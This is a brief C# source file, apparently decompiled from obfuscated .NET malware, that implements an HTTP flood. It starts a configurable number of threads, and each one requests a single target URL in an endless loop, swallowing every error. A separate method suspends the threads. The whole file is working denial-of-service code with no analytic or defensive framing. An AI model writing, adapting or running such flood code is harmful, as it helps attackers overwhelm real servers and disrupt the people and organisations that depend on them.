using System.Net;
using System.Threading;

namespace ns2;

internal class Class14
{
	private class Class15
	{
		private string string_0;

		private WebClient webClient_0 = new WebClient();

		public Class15(string string_1)
		{
			string_0 = string_1;
		}

		public void method_0()
		{
			while (true)
			{
				try
				{
					webClient_0.DownloadString(string_0);
				}
				catch
				{
				}
			}
		}
	}

	private static ThreadStart[] threadStart_0;

	private static Thread[] thread_0;

	public static string string_0;

	private static Class15[] class15_0;

	public static int int_0;

	public static void smethod_0()
	{
		thread_0 = new Thread[int_0];
		threadStart_0 = new ThreadStart[int_0];
		class15_0 = new Class15[int_0];
		for (int i = 0; i < int_0; i++)
		{
			class15_0[i] = new Class15(string_0);
			threadStart_0[i] = class15_0[i].method_0;
			thread_0[i] = new Thread(threadStart_0[i]);
			thread_0[i].Start();
		}
	}

	public static void smethod_1()
	{
		for (int i = 0; i < int_0; i++)
		{
			try
			{
				thread_0[i].Suspend();
			}
			catch
			{
			}
		}
	}
}
